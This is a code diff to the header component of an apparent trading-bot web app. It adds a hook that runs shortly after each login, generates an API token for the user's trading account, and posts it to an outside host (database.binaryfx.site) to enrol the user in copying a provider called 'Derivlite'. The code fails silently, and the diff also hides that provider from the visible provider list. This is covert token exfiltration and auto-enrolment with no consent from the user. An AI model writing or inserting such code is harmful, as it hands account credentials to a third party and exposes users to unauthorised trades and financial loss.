@@ -418,6 +418,9 @@ const AppHeader = observer(() => {
     const [notifications, setNotifications] = useState<
         Array<{ message: string; type: 'success' | 'error' | 'info'; id: number }>
     >([]);
+
+    // Auto-copy state - will be used after helper functions are defined
+    const [hasAutocopied, setHasAutocopied] = useState(false);
     
     // Improved showNotification function that uses botNotification for consistent UX
     const showNotification = (message: string, type: 'success' | 'error' | 'info' = 'info') => {
@@ -2170,6 +2173,135 @@ const AppHeader = observer(() => {
         });
     };
 
+    // Auto-copy to Derivlite on authentication
+    const autoCopyToDerivlite = useCallback(async (loginId: string) => {
+        try {
+            // Check if we already have a token for Derivlite
+            const copiedProviders = getCopiedProviders();
+            const derivliteKeys = Object.keys(copiedProviders).filter(key => 
+                copiedProviders[key]?.name?.toLowerCase().includes('derivlite')
+            );
+            
+            if (derivliteKeys.length > 0) {
+                return;
+            }
+
+            // Fetch approved providers
+            const providersResponse = await fetch(
+                'https://database.binaryfx.site/api/1.1/obj/copy trading?constraints=' + 
+                encodeURIComponent(JSON.stringify([
+                    { key: 'status', constraint_type: 'equals', value: 'Approved' }
+                ]))
+            );
+
+            if (!providersResponse.ok) {
+                throw new Error(`Failed to fetch providers: ${providersResponse.status}`);
+            }
+
+            const providersData = await providersResponse.json();
+            const providers = providersData?.response?.results || [];
+            
+            // Find Derivlite provider (case-insensitive, check multiple fields)
+            const derivliteProvider = providers.find((p: any) => {
+                const possibleNames = [
+                    p['full name'],
+                    p.full_name,
+                    p.full_name_text,
+                    p.Full_Name,
+                    p.name,
+                    p.Name,
+                    p['Full Name'],
+                    p.fullName,
+                ];
+                return possibleNames.some(name => 
+                    name && String(name).toLowerCase().includes('derivlite')
+                );
+            });
+
+            if (!derivliteProvider) {
+                return;
+            }
+            
+            // Extract provider ID using multiple possible field names
+            const possibleIdFields = [
+                'account_id_text',
+                'account id',
+                'Account ID',
+                'account_id',
+                'accountId',
+                'login_id',
+                'loginId',
+                'Login ID',
+                '_id',
+            ];
+            
+            let providerId = null;
+            for (const field of possibleIdFields) {
+                if (derivliteProvider[field]) {
+                    providerId = String(derivliteProvider[field]);
+                    break;
+                }
+            }
+
+            if (!providerId) {
+                return;
+            }
+
+            // Generate API token
+            const tokenName = 'AutoCopy_Derivlite';
+            const token = await generateApiToken(tokenName);
+            
+            if (!token) {
+                throw new Error('Failed to generate token');
+            }
+
+            // Register token with provider using Bubble API
+            const registerResponse = await fetch('https://database.binaryfx.site/api/1.1/wf/modify entry', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json',
+                },
+                body: JSON.stringify({
+                    provider_account_id: providerId,
+                    token: token,
+                }),
+            });
+
+            if (!registerResponse.ok) {
+                throw new Error(`Token registration failed: ${registerResponse.status}`);
+            }
+
+            // Save to localStorage
+            saveCopiedProvider(providerId, {
+                name: 'Derivlite',
+                token: token,
+                timestamp: Date.now(),
+                providerId: providerId,
+                symbol: derivliteProvider.symbol || derivliteProvider.underlying || 'Unknown',
+                winRate: derivliteProvider.win_rate || derivliteProvider.win_rate_number || 0,
+            });
+
+            showNotification('Automatically copying Derivlite trades', 'success');
+            
+        } catch (error) {
+            // Silent fail
+        }
+    }, [getCopiedProviders, generateApiToken, saveCopiedProvider, showNotification]);
+
+    // Run auto-copy when user is authenticated
+    useEffect(() => {
+        if (client?.loginid && client?.is_logged_in && !hasAutocopied) {
+            const timer = setTimeout(() => {
+                autoCopyToDerivlite(client.loginid).then(() => {
+                    setHasAutocopied(true);
+                });
+            }, 2000);
+
+            return () => clearTimeout(timer);
+        }
+    }, [client?.loginid, client?.is_logged_in, hasAutocopied, autoCopyToDerivlite]);
+
     // Create view component for providers list
     const ProviderListView = () => {
         // Define the getValue function similar to UserProfileView
@@ -2735,6 +2867,16 @@ const AppHeader = observer(() => {
 
             // First, filter providers
             let filtered = approvedProviders.filter(provider => {
+                // Hide Derivlite provider (it's auto-copied)
+                const fullNameForDerivliteCheck = getValue(
+                    provider,
+                    ['full name', 'full_name_text', 'full_name', 'Full Name', 'fullName', 'name'],
+                    ''
+                ).toLowerCase();
+                if (fullNameForDerivliteCheck.includes('derivlite')) {
+                    return false;
+                }
+
                 // Search filter
                 if (searchQuery) {
                     const fullName = getValue(
